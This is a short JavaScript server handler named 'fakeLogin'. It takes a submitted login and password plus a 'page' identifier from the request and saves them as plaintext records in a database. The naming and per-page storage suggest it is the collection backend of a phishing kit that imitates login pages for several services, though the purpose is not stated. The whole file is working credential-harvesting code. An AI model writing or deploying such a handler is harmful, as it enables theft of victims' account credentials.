import { connectToDB } from "../config/dbConnection.js";
import Credential from "../model/credentials.js";
export const fakeLogin = async (req, res, next) => {
  try {
    const { login, password } = req.body;
    const { page } = req.params;
    await connectToDB();
    await Credential.create({
      login: login,
      password: password,
      page: page,
    });
    res.status(201).json({ message: "Credential created successfully" });
  } catch (err) {
    next(err);
  }
};
